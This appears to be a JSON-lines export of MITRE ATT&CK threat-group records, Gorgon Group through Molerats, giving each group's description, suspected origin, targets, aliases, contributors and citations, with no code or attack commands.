{"ID":"G0078","name":"Gorgon Group","description":"[Gorgon Group](https://attack.mitre.org/groups/G0078) is a threat group consisting of members who are suspected to be Pakistan-based or have other connections to Pakistan. The group has performed a mix of criminal and targeted attacks, including campaigns against government organizations in the United Kingdom, Spain, Russia, and the United States. (Citation: Unit 42 Gorgon Group Aug 2018)","url":"https://attack.mitre.org/groups/G0078","created":"17 October 2018","last modified":"12 October 2021","version":"1.5","contributors":null,"associated groups":null,"associated groups citations":null,"relationship citations":"(Citation: Unit 42 Gorgon Group Aug 2018),(Citation: Unit 42 Gorgon Group Aug 2018),"}
{"ID":"G0043","name":"Group5","description":"[Group5](https://attack.mitre.org/groups/G0043) is a threat group with a suspected Iranian nexus, though this attribution is not definite. The group has targeted individuals connected to the Syrian opposition via spearphishing and watering holes, normally using Syrian and Iranian themes. [Group5](https://attack.mitre.org/groups/G0043) has used two commonly available remote access tools (RATs), [njRAT](https://attack.mitre.org/software/S0385) and [NanoCore](https://attack.mitre.org/software/S0336), as well as an Android RAT, DroidJack. (Citation: Citizen Lab Group5)","url":"https://attack.mitre.org/groups/G0043","created":"31 May 2017","last modified":"30 March 2020","version":"1.2","contributors":null,"associated groups":null,"associated groups citations":null,"relationship citations":"(Citation: Citizen Lab Group5),(Citation: Citizen Lab Group5),"}
{"ID":"G0125","name":"HAFNIUM","description":"[HAFNIUM](https://attack.mitre.org/groups/G0125) is a likely state-sponsored cyber espionage group operating out of China that has been active since at least January 2021. [HAFNIUM](https://attack.mitre.org/groups/G0125) primarily targets entities in the US across a number of industry sectors, including infectious disease researchers, law firms, higher education institutions, defense contractors, policy think tanks, and NGOs.(Citation: Microsoft HAFNIUM March 2020)(Citation: Volexity Exchange Marauder March 2021)","url":"https://attack.mitre.org/groups/G0125","created":"03 March 2021","last modified":"10 April 2023","version":"1.3","contributors":"Daniyal Naeem, BT Security; Harshal Tupsamudre, Qualys; Matt Brenton, Zurich Insurance Group; Mayuresh Dani, Qualys; Vinayak Wadhwa, SAFE Security","associated groups":"Operation Exchange Marauder","associated groups citations":"(Citation: Volexity Exchange Marauder March 2021)","relationship citations":"(Citation: Tarrask scheduled task),(Citation: Volexity Exchange Marauder March 2021),(Citation: Rapid7 HAFNIUM Mar 2021),(Citation: FireEye Exchange Zero Days March 2021),(Citation: Volexity Exchange Marauder March 2021),(Citation: Rapid7 HAFNIUM Mar 2021),(Citation: FireEye Exchange Zero Days March 2021),(Citation: Tarrask scheduled task),(Citation: Microsoft HAFNIUM March 2020),"}
{"ID":"G1001","name":"HEXANE","description":"[HEXANE](https://attack.mitre.org/groups/G1001) is a cyber espionage threat group that has targeted oil & gas, telecommunications, aviation, and internet service provider organizations since at least 2017. Targeted companies have been located in the Middle East and Africa, including Israel, Saudi Arabia, Kuwait, Morocco, and Tunisia. [HEXANE](https://attack.mitre.org/groups/G1001)'s TTPs appear similar to [APT33](https://attack.mitre.org/groups/G0064) and [OilRig](https://attack.mitre.org/groups/G0049) but due to differences in victims and tools it is tracked as a separate entity.(Citation: Dragos Hexane)(Citation: Kaspersky Lyceum October 2021)(Citation: ClearSky Siamesekitten August 2021)(Citation: Accenture Lyceum Targets November 2021)","url":"https://attack.mitre.org/groups/G1001","created":"17 October 2018","last modified":"22 March 2023","version":"2.1","contributors":"Dragos Threat Intelligence; Mindaugas Gudzis, BT Security","associated groups":"Lyceum, Siamesekitten, Spirlin","associated groups citations":"(Citation: SecureWorks August 2019), (Citation: ClearSky Siamesekitten August 2021), (Citation: Accenture Lyceum Targets November 2021)","relationship citations":"(Citation: Kaspersky Lyceum October 2021),(Citation: ClearSky Siamesekitten August 2021),(Citation: SecureWorks August 2019),(Citation: Accenture Lyceum Targets November 2021),(Citation: Zscaler Lyceum DnsSystem June 2022),(Citation: Dragos Hexane),(Citation: Microsoft POLONIUM June 2022),(Citation: Kaspersky Lyceum October 2021),(Citation: ClearSky Siamesekitten August 2021),(Citation: SecureWorks August 2019),(Citation: Kaspersky APT Trends Q1 April 2021),(Citation: Zscaler Lyceum DnsSystem June 2022),"}
{"ID":"G0126","name":"Higaisa","description":"[Higaisa](https://attack.mitre.org/groups/G0126) is a threat group suspected to have South Korean origins. [Higaisa](https://attack.mitre.org/groups/G0126) has targeted government, public, and trade organizations in North Korea; however, they have also carried out attacks in China, Japan, Russia, Poland, and other nations. [Higaisa](https://attack.mitre.org/groups/G0126) was first disclosed in early 2019 but is assessed to have operated as early as 2009.(Citation: Malwarebytes Higaisa 2020)(Citation: Zscaler Higaisa 2020)(Citation: PTSecurity Higaisa 2020)","url":"https://attack.mitre.org/groups/G0126","created":"05 March 2021","last modified":"22 April 2021","version":"1.0","contributors":"Daniyal Naeem, BT Security","associated groups":null,"associated groups citations":null,"relationship citations":"(Citation: PTSecurity Higaisa 2020),(Citation: Malwarebytes Higaisa 2020),(Citation: PTSecurity Higaisa 2020),(Citation: Malwarebytes Higaisa 2020),(Citation: Zscaler Higaisa 2020),"}
{"ID":"G0100","name":"Inception","description":"[Inception](https://attack.mitre.org/groups/G0100) is a cyber espionage group active since at least 2014. The group has targeted multiple industries and governmental entities primarily in Russia, but has also been active in the United States and throughout Europe, Asia, Africa, and the Middle East.(Citation: Unit 42 Inception November 2018)(Citation: Symantec Inception Framework March 2018)(Citation: Kaspersky Cloud Atlas December 2014)","url":"https://attack.mitre.org/groups/G0100","created":"08 May 2020","last modified":"12 October 2021","version":"1.1","contributors":"Oleg Skulkin, Group-IB","associated groups":"Cloud Atlas, Inception Framework","associated groups citations":"(Citation: Kaspersky Cloud Atlas December 2014), (Citation: Symantec Inception Framework March 2018)","relationship citations":"(Citation: Unit 42 Inception November 2018),(Citation: Kaspersky Cloud Atlas August 2019),(Citation: Unit 42 Inception November 2018),(Citation: Kaspersky Cloud Atlas August 2019),(Citation: Kaspersky Cloud Atlas December 2014),(Citation: Symantec Inception Framework March 2018),"}
{"ID":"G0136","name":"IndigoZebra","description":"[IndigoZebra](https://attack.mitre.org/groups/G0136) is a suspected Chinese cyber espionage group that has been targeting Central Asian governments since at least 2014.(Citation: HackerNews IndigoZebra July 2021)(Citation: Checkpoint IndigoZebra July 2021)(Citation: Securelist APT Trends Q2 2017)","url":"https://attack.mitre.org/groups/G0136","created":"24 September 2021","last modified":"16 October 2021","version":"1.0","contributors":"Manikantan Srinivasan, NEC Corporation India; Pooja Natarajan, NEC Corporation India; Yoshihiro Kori, NEC Corporation","associated groups":null,"associated groups citations":null,"relationship citations":"(Citation: Securelist APT Trends Q2 2017),(Citation: Checkpoint IndigoZebra July 2021),(Citation: HackerNews IndigoZebra July 2021),(Citation: Checkpoint IndigoZebra July 2021),(Citation: Securelist APT Trends Q2 2017),"}
{"ID":"G0119","name":"Indrik Spider","description":"[Indrik Spider](https://attack.mitre.org/groups/G0119) is a Russia-based cybercriminal group that has been active since at least 2014. [Indrik Spider](https://attack.mitre.org/groups/G0119) initially started with the [Dridex](https://attack.mitre.org/software/S0384) banking Trojan, and then by 2017 they began running ransomware operations using [BitPaymer](https://attack.mitre.org/software/S0570), [WastedLocker](https://attack.mitre.org/software/S0612), and Hades ransomware.(Citation: Crowdstrike Indrik November 2018)(Citation: Crowdstrike EvilCorp March 2021)(Citation: Treasury EvilCorp Dec 2019)","url":"https://attack.mitre.org/groups/G0119","created":"06 January 2021","last modified":"15 September 2022","version":"2.1","contributors":null,"associated groups":"Evil Corp","associated groups citations":"(Citation: Crowdstrike EvilCorp March 2021)(Citation: Treasury EvilCorp Dec 2019)","relationship citations":"(Citation: Treasury EvilCorp Dec 2019),(Citation: Crowdstrike Indrik November 2018),(Citation: Crowdstrike EvilCorp March 2021),(Citation: NCC Group WastedLocker June 2020),(Citation: Symantec WastedLocker June 2020),(Citation: Symantec WastedLocker June 2020),(Citation: Crowdstrike Indrik November 2018),"}
{"ID":"G0004","name":"Ke3chang","description":"[Ke3chang](https://attack.mitre.org/groups/G0004) is a threat group attributed to actors operating out of China. [Ke3chang](https://attack.mitre.org/groups/G0004) has targeted oil, government, diplomatic, military, and NGOs in Central and South America, the Caribbean, Europe, and North America since at least 2010.(Citation: Mandiant Operation Ke3chang November 2014)(Citation: NCC Group APT15 Alive and Strong)(Citation: APT15 Intezer June 2018)(Citation: Microsoft NICKEL December 2021)","url":"https://attack.mitre.org/groups/G0004","created":"31 May 2017","last modified":"22 July 2022","version":"2.0","contributors":"Hiroki Nagahama, NEC Corporation; Manikantan Srinivasan, NEC Corporation India; Pooja Natarajan, NEC Corporation India","associated groups":"APT15, GREF, Mirage, NICKEL, Playful Dragon, RoyalAPT, Vixen Panda","associated groups citations":"(Citation: NCC Group APT15 Alive and Strong), (Citation: NCC Group APT15 Alive and Strong), (Citation: NCC Group APT15 Alive and Strong), (Citation: Microsoft NICKEL December 2021), (Citation: NCC Group APT15 Alive and Strong)(Citation: APT15 Intezer June 2018), (Citation: APT15 Intezer June 2018), (Citation: NCC Group APT15 Alive and Strong)(Citation: APT15 Intezer June 2018)","relationship citations":"(Citation: NCC Group APT15 Alive and Strong),(Citation: ESET Okrum July 2019),(Citation: APT15 Intezer June 2018),(Citation: Microsoft NICKEL December 2021),(Citation: Mandiant Operation Ke3chang November 2014),(Citation: Mandiant Operation Ke3chang November 2014),(Citation: NCC Group APT15 Alive and Strong),(Citation: Microsoft NICKEL December 2021),"}
{"ID":"G0094","name":"Kimsuky","description":"[Kimsuky](https://attack.mitre.org/groups/G0094) is a North Korea-based cyber espionage group that has been active since at least 2012. The group initially focused on targeting South Korean government entities, think tanks, and individuals identified as experts in various fields, and expanded its operations to include the United States, Russia, Europe, and the UN. [Kimsuky](https://attack.mitre.org/groups/G0094) has focused its intelligence collection activities on foreign policy and national security issues related to the Korean peninsula, nuclear policy, and sanctions.(Citation: EST Kimsuky April 2019)(Citation: BRI Kimsuky April 2019)(Citation: Cybereason Kimsuky November 2020)(Citation: Malwarebytes Kimsuky June 2021)(Citation: CISA AA20-301A Kimsuky)\n\n[Kimsuky](https://attack.mitre.org/groups/G0094) was assessed to be responsible for the 2014 Korea Hydro & Nuclear Power Co. compromise; other notable campaigns include Operation STOLEN PENCIL (2018), Operation Kabar Cobra (2019), and Operation Smoke Screen (2019).(Citation: Netscout Stolen Pencil Dec 2018)(Citation: EST Kimsuky SmokeScreen April 2019)(Citation: AhnLab Kimsuky Kabar Cobra Feb 2019)\n\nNorth Korean group definitions are known to have significant overlap, and some security researchers report all North Korean state-sponsored cyber activity under the name [Lazarus Group](https://attack.mitre.org/groups/G0032) instead of tracking clusters or subgroups.","url":"https://attack.mitre.org/groups/G0094","created":"26 August 2019","last modified":"30 November 2022","version":"3.1","contributors":"Dongwook Kim, KISA; Taewoo Lee, KISA","associated groups":"Black Banshee, STOLEN PENCIL, Thallium, Velvet Chollima","associated groups citations":"(Citation: Cybereason Kimsuky November 2020)(Citation: Malwarebytes Kimsuky June 2021), (Citation: Netscout Stolen Pencil Dec 2018), (Citation: Cybereason Kimsuky November 2020)(Citation: Malwarebytes Kimsuky June 2021), (Citation: Zdnet Kimsuky Dec 2018)(Citation: ThreatConnect Kimsuky September 2020)(Citation: Malwarebytes Kimsuky June 2021)","relationship citations":"(Citation: Malwarebytes Kimsuky June 2021),(Citation: KISA Operation Muzabi),(Citation: CISA AA20-301A Kimsuky),(Citation: Netscout Stolen Pencil Dec 2018),(Citation: Talos Kimsuky Nov 2021),(Citation: Crowdstrike GTR2020 Mar 2020),(Citation: Cybereason Kimsuky November 2020),(Citation: ThreatConnect Kimsuky September 2020),(Citation: Malwarebytes Kimsuky June 2021),(Citation: VirusBulletin Kimsuky October 2019),(Citation: Securelist Kimsuky Sept 2013),(Citation: EST Kimsuky April 2019),(Citation: KISA Operation Muzabi),(Citation: CISA AA20-301A Kimsuky),(Citation: Zdnet Kimsuky Group September 2020),(Citation: Netscout Stolen Pencil Dec 2018),(Citation: Talos Kimsuky Nov 2021),(Citation: Zdnet Kimsuky Dec 2018),(Citation: Crowdstrike GTR2020 Mar 2020),(Citation: Cybereason Kimsuky November 2020),"}
{"ID":"G1004","name":"LAPSUS$","description":"[LAPSUS$](https://attack.mitre.org/groups/G1004) is cyber criminal threat group that has been active since at least mid-2021. [LAPSUS$](https://attack.mitre.org/groups/G1004) specializes in large-scale social engineering and extortion operations, including destructive attacks without the use of ransomware. The group has targeted organizations globally, including in the government, manufacturing, higher education, energy, healthcare, technology, telecommunications, and media sectors.(Citation: BBC LAPSUS Apr 2022)(Citation: MSTIC DEV-0537 Mar 2022)(Citation: UNIT 42 LAPSUS Mar 2022)","url":"https://attack.mitre.org/groups/G1004","created":"09 June 2022","last modified":"11 April 2023","version":"1.1","contributors":"David Hughes, BT Security; Flavio Costa, Cisco; Matt Brenton, Zurich Insurance Group","associated groups":"DEV-0537","associated groups citations":"(Citation: MSTIC DEV-0537 Mar 2022)","relationship citations":"(Citation: MSTIC DEV-0537 Mar 2022),(Citation: MSTIC DEV-0537 Mar 2022),"}
{"ID":"G0032","name":"Lazarus Group","description":"[Lazarus Group](https://attack.mitre.org/groups/G0032) is a North Korean state-sponsored cyber threat group that has been attributed to the Reconnaissance General Bureau.(Citation: US-CERT HIDDEN COBRA June 2017)(Citation: Treasury North Korean Cyber Groups September 2019) The group has been active since at least 2009 and was reportedly responsible for the November 2014 destructive wiper attack against Sony Pictures Entertainment as part of a campaign named Operation Blockbuster by Novetta. Malware used by [Lazarus Group](https://attack.mitre.org/groups/G0032) correlates to other reported campaigns, including Operation Flame, Operation 1Mission, Operation Troy, DarkSeoul, and Ten Days of Rain. (Citation: Novetta Blockbuster)\n\nNorth Korean group definitions are known to have significant overlap, and some security researchers report all North Korean state-sponsored cyber activity under the name [Lazarus Group](https://attack.mitre.org/groups/G0032) instead of tracking clusters or subgroups, such as [Andariel](https://attack.mitre.org/groups/G0138), [APT37](https://attack.mitre.org/groups/G0067), [APT38](https://attack.mitre.org/groups/G0082), and [Kimsuky](https://attack.mitre.org/groups/G0094).   ","url":"https://attack.mitre.org/groups/G0032","created":"31 May 2017","last modified":"30 March 2023","version":"3.2","contributors":"Dragos  Threat  Intelligence; Kyaw Pyiyt Htet, @KyawPyiytHtet","associated groups":"Guardians of Peace, HIDDEN COBRA, Labyrinth Chollima, NICKEL ACADEMY, ZINC","associated groups citations":"(Citation: US-CERT HIDDEN COBRA June 2017), The U.S. Government refers to malicious cyber activity by the North Korean government as HIDDEN COBRA.(Citation: US-CERT HIDDEN COBRA June 2017)(Citation: US-CERT HOPLIGHT Apr 2019), (Citation: CrowdStrike Labyrinth Chollima Feb 2022), (Citation: Secureworks NICKEL ACADEMY Dec 2017), (Citation: Microsoft ZINC disruption Dec 2017)","relationship citations":"(Citation: CISA EB Aug 2020),(Citation: Kaspersky ThreatNeedle Feb 2021),(Citation: TrendMicro Lazarus Nov 2018),(Citation: US-CERT TYPEFRAME June 2018),(Citation: TrendMicro macOS Dacls May 2020),(Citation: US-CERT BLINDINGCAN Aug 2020),(Citation: Kaspersky Dtrack),(Citation: Novetta Blockbuster Loaders),(Citation: Lazarus RATANKBA),(Citation: McAfee Bankshot),(Citation: CISA AppleJeus Feb 2021),(Citation: CISA MAR-10288834-2.v1  TAINTEDSCRIBE MAY 2020),(Citation: US-CERT HARDRAIN March 2018),(Citation: SecureWorks WannaCry Analysis),(Citation: Novetta Blockbuster Destructive Malware),(Citation: FireEye WannaCry 2017),(Citation: ClearSky Lazarus Aug 2020),(Citation: US-CERT FALLCHILL Nov 2017),(Citation: US-CERT BADCALL),(Citation: Novetta Blockbuster),(Citation: US-CERT HOTCROISSANT February 2020),(Citation: LogRhythm WannaCry),(Citation: US-CERT HOPLIGHT Apr 2019),(Citation: FireEye APT38 Oct 2018),(Citation: SentinelOne Lazarus macOS July 2020),(Citation: US-CERT Volgmer Nov 2017),(Citation: McAfee GhostSecret),(Citation: US-CERT KEYMARBLE Aug 2018),(Citation: Kaspersky ThreatNeedle Feb 2021),(Citation: RATANKBA),(Citation: Google TAG Lazarus Jan 2021),(Citation: TrendMicro macOS Dacls May 2020),(Citation: Novetta Blockbuster Loaders),(Citation: CISA AppleJeus Feb 2021),(Citation: McAfee Bankshot),(Citation: Novetta Blockbuster RATs),(Citation: US-CERT SHARPKNOT June 2018),(Citation: ESET Twitter Ida Pro Nov 2021),(Citation: CISA MAR-10288834-2.v1  TAINTEDSCRIBE MAY 2020),(Citation: Novetta Blockbuster Destructive Malware),(Citation: Novetta Blockbuster Tools),(Citation: US-CERT FALLCHILL Nov 2017),(Citation: McAfee Lazarus Jul 2020),(Citation: Novetta Blockbuster),(Citation: Lazarus APT January 2022),(Citation: Qualys LolZarus),(Citation: SentinelOne Lazarus macOS July 2020),(Citation: McAfee Lazarus Resurfaces Feb 2018),(Citation: McAfee GhostSecret),(Citation: McAfee Lazarus Jul 2020),(Citation: McAfee Lazarus Nov 2020),(Citation: ClearSky Lazarus Aug 2020),(Citation: ESET Lazarus Jun 2020)"}
{"ID":"G0140","name":"LazyScripter","description":"[LazyScripter](https://attack.mitre.org/groups/G0140) is threat group that has mainly targeted the airlines industry since at least 2018, primarily using open-source toolsets.(Citation: MalwareBytes LazyScripter Feb 2021)","url":"https://attack.mitre.org/groups/G0140","created":"24 November 2021","last modified":"22 March 2023","version":"1.1","contributors":"Hiroki Nagahama, NEC Corporation; Manikantan Srinivasan, NEC Corporation India; Pooja Natarajan, NEC Corporation India","associated groups":null,"associated groups citations":null,"relationship citations":"(Citation: MalwareBytes LazyScripter Feb 2021),(Citation: MalwareBytes LazyScripter Feb 2021),"}
{"ID":"G0077","name":"Leafminer","description":"[Leafminer](https://attack.mitre.org/groups/G0077) is an Iranian threat group that has targeted government organizations and business entities in the Middle East since at least early 2017. (Citation: Symantec Leafminer July 2018)","url":"https://attack.mitre.org/groups/G0077","created":"17 October 2018","last modified":"22 March 2023","version":"2.4","contributors":null,"associated groups":"Raspite","associated groups citations":"(Citation: Dragos Raspite Aug 2018)","relationship citations":"(Citation: Symantec Leafminer July 2018),(Citation: Symantec Leafminer July 2018),"}
{"ID":"G0065","name":"Leviathan","description":"[Leviathan](https://attack.mitre.org/groups/G0065) is a Chinese state-sponsored cyber espionage group that has been attributed to the Ministry of State Security's (MSS) Hainan State Security Department and an affiliated front company.(Citation: CISA AA21-200A APT40 July 2021) Active since at least 2009, [Leviathan](https://attack.mitre.org/groups/G0065) has targeted the following sectors: academia, aerospace/aviation, biomedical, defense industrial base, government, healthcare, manufacturing, maritime, and transportation across the US, Canada, Europe, the Middle East, and Southeast Asia.(Citation: CISA AA21-200A APT40 July 2021)(Citation: Proofpoint Leviathan Oct 2017)(Citation: FireEye Periscope March 2018)","url":"https://attack.mitre.org/groups/G0065","created":"18 April 2018","last modified":"15 April 2022","version":"3.0","contributors":"Valerii Marchuk, Cybersecurity Help s.r.o.","associated groups":"APT40, BRONZE MOHAWK, Gadolinium, Kryptonite Panda, MUDCARP, TEMP.Jumper, TEMP.Periscope","associated groups citations":"FireEye reporting on TEMP.Periscope (which was combined into APT40) indicated TEMP.Periscope was reported upon as Leviathan.(Citation: CISA AA21-200A APT40 July 2021)(Citation: Proofpoint Leviathan Oct 2017)(Citation: FireEye Periscope March 2018)(Citation: FireEye APT40 March 2019), (Citation: CISA AA21-200A APT40 July 2021)(Citation: SecureWorks BRONZE MOHAWK n.d.), (Citation: CISA AA21-200A APT40 July 2021)(Citation: MSTIC GADOLINIUM September 2020), (Citation: CISA AA21-200A APT40 July 2021)(Citation: Crowdstrike KRYPTONITE PANDA August 2018), (Citation: CISA AA21-200A APT40 July 2021)(Citation: Accenture MUDCARP March 2019), [Leviathan](https://attack.mitre.org/groups/G0065) was previously reported upon by FireEye as TEMP.Periscope and TEMP.Jumper.(Citation: CISA AA21-200A APT40 July 2021)(Citation: FireEye APT40 March 2019), [Leviathan](https://attack.mitre.org/groups/G0065) was previously reported upon by FireEye as TEMP.Periscope and TEMP.Jumper.(Citation: CISA AA21-200A APT40 July 2021)(Citation: FireEye Periscope March 2018)(Citation: FireEye APT40 March 2019)","relationship citations":"(Citation: Proofpoint Leviathan Oct 2017),(Citation: FireEye APT40 March 2019),(Citation: FireEye Periscope March 2018),(Citation: Accenture MUDCARP March 2019),(Citation: CISA AA21-200A APT40 July 2021),(Citation: Proofpoint Leviathan Oct 2017),(Citation: FireEye APT40 March 2019),(Citation: FireEye Periscope March 2018),(Citation: Accenture MUDCARP March 2019),(Citation: CISA AA21-200A APT40 July 2021),"}
{"ID":"G0030","name":"Lotus Blossom","description":"[Lotus Blossom](https://attack.mitre.org/groups/G0030) is a threat group that has targeted government and military organizations in Southeast Asia. (Citation: Lotus Blossom Jun 2015)","url":"https://attack.mitre.org/groups/G0030","created":"31 May 2017","last modified":"25 March 2019","version":"2.0","contributors":null,"associated groups":"DRAGONFISH, Spring Dragon","associated groups citations":"(Citation: Accenture Dragonfish Jan 2018), (Citation: Spring Dragon Jun 2015)(Citation: Accenture Dragonfish Jan 2018)","relationship citations":"(Citation: Emissary Trojan Feb 2016),(Citation: Accenture Dragonfish Jan 2018),(Citation: Spring Dragon Jun 2015),(Citation: Lotus Blossom Dec 2015),,"}
{"ID":"G1014","name":"LuminousMoth","description":"[LuminousMoth](https://attack.mitre.org/groups/G1014) is a Chinese-speaking cyber espionage group that has been active since at least October 2020. [LuminousMoth](https://attack.mitre.org/groups/G1014) has targeted high-profile organizations, including government entities, in Myanmar, the Philippines, Thailand, and other parts of Southeast Asia. Some security researchers have concluded there is a connection between [LuminousMoth](https://attack.mitre.org/groups/G1014) and [Mustang Panda](https://attack.mitre.org/groups/G0129) based on similar targeting and TTPs, as well as network infrastructure overlaps.(Citation: Kaspersky LuminousMoth July 2021)(Citation: Bitdefender LuminousMoth July 2021)","url":"https://attack.mitre.org/groups/G1014","created":"23 February 2023","last modified":"17 April 2023","version":"1.0","contributors":"Kyaw Pyiyt Htet, @KyawPyiytHtet; Zaw Min Htun, @Z3TAE","associated groups":null,"associated groups citations":null,"relationship citations":"(Citation: Bitdefender LuminousMoth July 2021),(Citation: Kaspersky LuminousMoth July 2021),(Citation: Bitdefender LuminousMoth July 2021),(Citation: Kaspersky LuminousMoth July 2021),"}
{"ID":"G0095","name":"Machete","description":"[Machete](https://attack.mitre.org/groups/G0095) is a suspected Spanish-speaking cyber espionage group that has been active since at least 2010. It has primarily focused its operations within Latin America, with a particular emphasis on Venezuela, but also in the US, Europe, Russia, and parts of Asia. [Machete](https://attack.mitre.org/groups/G0095) generally targets high-profile organizations such as government institutions, intelligence services, and military units, as well as telecommunications and power companies.(Citation: Cylance Machete Mar 2017)(Citation: Securelist Machete Aug 2014)(Citation: ESET Machete July 2019)(Citation: 360 Machete Sep 2020)","url":"https://attack.mitre.org/groups/G0095","created":"13 September 2019","last modified":"06 October 2021","version":"2.0","contributors":"Matias Nicolas Porolli, ESET","associated groups":"APT-C-43, El Machete","associated groups citations":"(Citation: 360 Machete Sep 2020), (Citation: Cylance Machete Mar 2017)","relationship citations":"(Citation: ESET Machete July 2019),(Citation: Securelist Machete Aug 2014),(Citation: Cylance Machete Mar 2017),(Citation: ESET Machete July 2019),(Citation: 360 Machete Sep 2020),(Citation: Securelist Machete Aug 2014),"}
{"ID":"G0059","name":"Magic Hound","description":"[Magic Hound](https://attack.mitre.org/groups/G0059) is an Iranian-sponsored threat group that conducts long term, resource-intensive cyber espionage operations, likely on behalf of the Islamic Revolutionary Guard Corps. They have targeted European, U.S., and Middle Eastern government and military personnel, academics, journalists, and organizations such as the World Health Organization (WHO), via complex social engineering campaigns since at least 2014.(Citation: FireEye APT35 2018)(Citation: ClearSky Kittens Back 3 August 2020)(Citation: Certfa Charming Kitten January 2021)(Citation: Secureworks COBALT ILLUSION Threat Profile)(Citation: Proofpoint TA453 July2021)","url":"https://attack.mitre.org/groups/G0059","created":"16 January 2018","last modified":"13 January 2023","version":"5.1","contributors":"Anastasios Pingios; Bryan Lee; Daniyal Naeem, BT Security","associated groups":"APT35, COBALT ILLUSION, Charming Kitten, ITG18, Newscaster, Phosphorus, TA453","associated groups citations":"(Citation: FireEye APT35 2018)(Citation: Certfa Charming Kitten January 2021)(Citation: Check Point APT35 CharmPower January 2022), (Citation: Secureworks COBALT ILLUSION Threat Profile), (Citation: ClearSky Charming Kitten Dec 2017)(Citation: Eweek Newscaster and Charming Kitten May 2014)(Citation: ClearSky Kittens Back 2 Oct 2019)(Citation: ClearSky Kittens Back 3 August 2020)(Citation: Proofpoint TA453 March 2021)(Citation: Check Point APT35 CharmPower January 2022), (Citation: IBM ITG18 2020), Link analysis of infrastructure and tools revealed a potential relationship between Magic Hound and the older attack campaign called Newscaster (aka Newscasters).(Citation: Unit 42 Magic Hound Feb 2017)(Citation: FireEye APT35 2018), (Citation: Microsoft Phosphorus Mar 2019)(Citation: Microsoft Phosphorus Oct 2020)(Citation: US District Court of DC Phosphorus Complaint 2019)(Citation: Certfa Charming Kitten January 2021)(Citation: Proofpoint TA453 March 2021)(Citation: Check Point APT35 CharmPower January 2022), (Citation: Proofpoint TA453 March 2021)(Citation: Proofpoint TA453 July2021)(Citation: Check Point APT35 CharmPower January 2022)","relationship citations":"(Citation: Cybereason PowerLess February 2022),(Citation: DFIR Phosphorus November 2021),(Citation: Unit 42 Magic Hound Feb 2017),(Citation: Secureworks Cobalt Gypsy Feb 2017),(Citation: Check Point APT35 CharmPower January 2022),(Citation: FireEye APT35 2018),(Citation: ClearSky Charming Kitten Dec 2017),(Citation: DFIR Report APT35 ProxyShell March 2022),(Citation: Certfa Charming Kitten January 2021),(Citation: ClearSky Kittens Back 3 August 2020),(Citation: Cybereason PowerLess February 2022),(Citation: DFIR Phosphorus November 2021),(Citation: Unit 42 Magic Hound Feb 2017),(Citation: Secureworks Cobalt Gypsy Feb 2017),(Citation: Proofpoint TA453 July2021),(Citation: Check Point Rocket Kitten),(Citation: Check Point APT35 CharmPower January 2022),(Citation: Google Iran Threats October 2021),(Citation: Proofpoint TA453 March 2021),(Citation: Microsoft Iranian Threat Actor Trends November 2021),(Citation: Microsoft Phosphorus Mar 2019),(Citation: SecureWorks Mia Ash July 2017),(Citation: FireEye APT35 2018),(Citation: IBM ITG18 2020),(Citation: DFIR Report APT35 ProxyShell March 2022),"}
{"ID":"G1013","name":"Metador","description":"[Metador](https://attack.mitre.org/groups/G1013) is a suspected cyber espionage group that was first reported in September 2022. [Metador](https://attack.mitre.org/groups/G1013) has targeted a limited number of telecommunication companies, internet service providers, and universities in the Middle East and Africa. Security researchers named the group [Metador](https://attack.mitre.org/groups/G1013) based on the \"I am meta\" string in one of the group's malware samples and the expectation of Spanish-language responses from C2 servers.(Citation: SentinelLabs Metador Sept 2022)","url":"https://attack.mitre.org/groups/G1013","created":"25 January 2023","last modified":"14 April 2023","version":"1.0","contributors":"Massimiliano Romano, BT Security; Sittikorn Sangrattanapitak","associated groups":null,"associated groups citations":null,"relationship citations":"(Citation: SentinelLabs Metador Technical Appendix Sept 2022),(Citation: SentinelLabs Metador Sept 2022),(Citation: SentinelLabs Metador Sept 2022),"}
{"ID":"G0002","name":"Moafee","description":"[Moafee](https://attack.mitre.org/groups/G0002) is a threat group that appears to operate from the Guandong Province of China. Due to overlapping TTPs, including similar custom tools, Moafee is thought to have a direct or indirect relationship with the threat group [DragonOK](https://attack.mitre.org/groups/G0017). (Citation: Haq 2014)","url":"https://attack.mitre.org/groups/G0002","created":"31 May 2017","last modified":"30 March 2020","version":"1.1","contributors":null,"associated groups":null,"associated groups citations":null,"relationship citations":"(Citation: Haq 2014),(Citation: Haq 2014),"}
{"ID":"G0103","name":"Mofang","description":"[Mofang](https://attack.mitre.org/groups/G0103) is a likely China-based cyber espionage group, named for its frequent practice of imitating a victim's infrastructure. This adversary has been observed since at least May 2012 conducting focused attacks against government and critical infrastructure in Myanmar, as well as several other countries and sectors including military, automobile, and weapons industries.(Citation: FOX-IT May 2016 Mofang)","url":"https://attack.mitre.org/groups/G0103","created":"12 May 2020","last modified":"29 May 2020","version":"1.0","contributors":null,"associated groups":null,"associated groups citations":null,"relationship citations":",(Citation: FOX-IT May 2016 Mofang),"}
{"ID":"G0021","name":"Molerats","description":"[Molerats](https://attack.mitre.org/groups/G0021) is an Arabic-speaking, politically-motivated threat group that has been operating since 2012. The group's victims have primarily been in the Middle East, Europe, and the United States.(Citation: DustySky)(Citation: DustySky2)(Citation: Kaspersky MoleRATs April 2019)(Citation: Cybereason Molerats Dec 2020)","url":"https://attack.mitre.org/groups/G0021","created":"31 May 2017","last modified":"27 April 2021","version":"2.0","contributors":null,"associated groups":"Gaza Cybergang, Operation Molerats","associated groups citations":"(Citation: DustySky)(Citation: Kaspersky MoleRATs April 2019)(Citation: Cybereason Molerats Dec 2020), (Citation: FireEye Operation Molerats)(Citation: Cybereason Molerats Dec 2020)","relationship citations":"(Citation: DustySky),(Citation: FireEye Operation Molerats),(Citation: Unit42 Molerat Mar 2020),(Citation: DustySky2),(Citation: Kaspersky MoleRATs April 2019),(Citation: Cybereason Molerats Dec 2020),(Citation: DustySky),(Citation: FireEye Operation Molerats),(Citation: Unit42 Molerat Mar 2020),(Citation: Kaspersky MoleRATs April 2019),(Citation: Cybereason Molerats Dec 2020),"}
